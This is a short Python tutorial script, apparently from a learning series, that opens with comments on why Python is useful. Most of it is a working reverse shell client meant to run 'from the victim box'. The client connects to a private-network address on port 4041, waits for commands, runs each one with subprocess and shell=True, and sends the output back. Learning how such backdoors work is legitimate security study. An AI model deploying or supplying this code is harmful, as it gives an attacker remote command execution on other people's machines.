# Beginning template
# Learing Python with Alh4zr3d
''' Why python?
# Cross-plattform
# Simple & dynamically typed
# Object-oriented
# Lots of powerful moduls
# Lots of third party Libraries
# Cool Name

'''
''' Creating a reverse shell in Python 2.7

Client Script
# From the Victim box

'''
from re import sub
import socket
import subprocess

#import requests
#import http

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.178.52', 4041))

# Implement a loop
while True:
    command  = s.recv(4096).decode('UTF-8')
    #print("Command received: "+ command)
    if command =='exit':
        s.close()
        break
    else:
        # subprocess system function
        cmd= subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        s.send(cmd.stdout)

#print(F"Lets doing some code ! \n")
